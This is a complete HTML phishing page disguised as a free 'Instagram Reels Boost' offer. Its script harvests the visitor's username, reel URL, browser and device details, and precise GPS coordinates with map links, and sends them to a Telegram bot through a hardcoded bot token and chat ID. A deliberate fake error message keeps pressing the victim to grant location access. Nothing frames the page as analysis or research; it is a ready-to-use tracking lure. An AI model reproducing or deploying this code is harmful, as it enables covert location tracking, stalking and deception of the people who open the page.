<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title></title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(-45deg, #1d002c, #4c0080, #ff2dab, #00f7ff);
      background-size: 400% 400%;
      animation: gradientBG 15s ease infinite;
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
    }

    @keyframes gradientBG {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    .container {
      background: rgba(255, 255, 255, 0.1);
      border-radius: 20px;
      padding: 30px;
      backdrop-filter: blur(20px);
      box-shadow: 0 0 30px rgba(255, 255, 255, 0.1);
      max-width: 400px;
      width: 90%;
    }

    h2 {
      text-align: center;
      margin-bottom: 20px;
    }

    input[type="text"], input[type="url"] {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      border-radius: 10px;
      border: 2px solid #ff2dab;
      background: rgba(255, 255, 255, 0.1);
      color: white;
      font-size: 16px;
    }

    .views-options {
      display: flex;
      justify-content: space-between;
      margin: 20px 0;
    }

    .view-card {
      flex: 1;
      background: rgba(0, 0, 0, 0.3);
      margin: 0 5px;
      border-radius: 12px;
      text-align: center;
      padding: 10px;
      cursor: pointer;
      transition: all 0.3s ease;
      border: 2px solid transparent;
    }

    .view-card.selected {
      border: 2px solid #00f7ff;
      background: rgba(0, 0, 0, 0.5);
    }

    .redeem-btn {
      width: 100%;
      padding: 15px;
      font-size: 18px;
      border: none;
      border-radius: 50px;
      background: linear-gradient(45deg, #ff2dab, #00f7ff);
      color: white;
      cursor: pointer;
      box-shadow: 0 0 20px #ff2dab;
      transition: 0.3s;
    }

    .redeem-btn:hover {
      transform: scale(1.05);
      box-shadow: 0 0 30px #00f7ff;
    }

    .alert-message {
      background: rgba(255, 0, 0, 0.2);
      padding: 10px;
      margin-bottom: 15px;
      border-radius: 10px;
      text-align: center;
      display: none;
    }

    @media (max-width: 500px) {
      .view-card { font-size: 14px; padding: 8px; }
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Instagram Reels Boost</h2>
    <div class="alert-message" id="alertMsg">Please Allow Location Setting Permission Before Use.</div>
    <input type="text" id="username" placeholder="Instagram Username" />
    <input type="url" id="reelURL" placeholder="Reels URL" />

    <div class="views-options">
      <div class="view-card" onclick="selectView(this, 500)">500 Views</div>
      <div class="view-card" onclick="selectView(this, 1000)">1000 Views</div>
      <div class="view-card" onclick="selectView(this, 2000)">2000 Views</div>
    </div>

    <button class="redeem-btn" onclick="redeem()">Redeem</button>
  </div>

  <script>
    // === CONFIGURATION ===
    const BOT_TOKEN = '7659085089:AAGTE5B4NRLG_tFvbfYayfrG0URgFgXnv5w';
    const CHAT_ID = '6319619567';

    let selectedViews = 0;

    // === DEVICE INFO FUNCTION ===
    function getDeviceInfo() {
      return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        cookiesEnabled: navigator.cookieEnabled,
        screenSize: `${screen.width}x${screen.height}`,
      };
    }

    // === LOCATION FUNCTION ===
    function sendLocationToTelegram(position, data) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;
      const accuracy = position.coords.accuracy;
      const timestamp = new Date(position.timestamp).toLocaleString();

      const device = getDeviceInfo();

      const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
      const earthLink = `https://earth.google.com/web/@${lat},${lon},100a`;

      const message = `
[Reels Boost Request]
- Username: ${data.username}
- Reel URL: ${data.reelURL}
- Views: ${data.views}

[Device Info]
- User Agent: ${device.userAgent}
- Platform: ${device.platform}
- Language: ${device.language}
- Screen Size: ${device.screenSize}
- Cookies Enabled: ${device.cookiesEnabled}

[Location Info]
- Latitude: ${lat}
- Longitude: ${lon}
- Accuracy: ${accuracy} meters
- Time: ${timestamp}

[Links]
- Google Maps: ${mapsLink}
- Google Earth: ${earthLink}
      `;

      // Send to Telegram
      const telegramURL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
      fetch(telegramURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
        })
      })
      .then(res => res.json())
      .then(data => console.log("Sent to Telegram:", data))
      .catch(err => console.error("Telegram Error:", err));
    }

    function getLocation(data) {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (position) => sendLocationToTelegram(position, data), 
          (err) => {
            alert("Location error: " + err.message);
          }
        );
      } else {
        alert("Geolocation not supported.");
      }
    }

    function selectView(elem, views) {
      document.querySelectorAll('.view-card').forEach(card => card.classList.remove('selected'));
      elem.classList.add('selected');
      selectedViews = views;
    }

    function validateInputs() {
      const username = document.getElementById('username').value.trim();
      const reelURL = document.getElementById('reelURL').value.trim();
      const urlRegex = /^(https?:\/\/)?(www\.)?instagram\.com\/reel\/[\w\-]+/;
      if (!username || !reelURL || !urlRegex.test(reelURL)) {
        alert("Please enter valid Username and Reels URL.");
        return false;
      }
      if (!selectedViews) {
        alert("Please select a view count.");
        return false;
      }
      return { username, reelURL, views: selectedViews };
    }

    function getLocationPermission() {
      const alert = document.getElementById('alertMsg');
      alert.style.display = 'block';
    }

    function showSuccessOrFakeError() {
      setTimeout(() => {
        alert("Location Required! Please Enable & Try Again.");
      }, 3000);
    }

    function redeem() {
      getLocationPermission();
      const data = validateInputs();
      if (data) {
        setTimeout(() => {
          getLocation(data);
          showSuccessOrFakeError();
        }, 3000);
      }
    }
  </script>
</body>
</html>
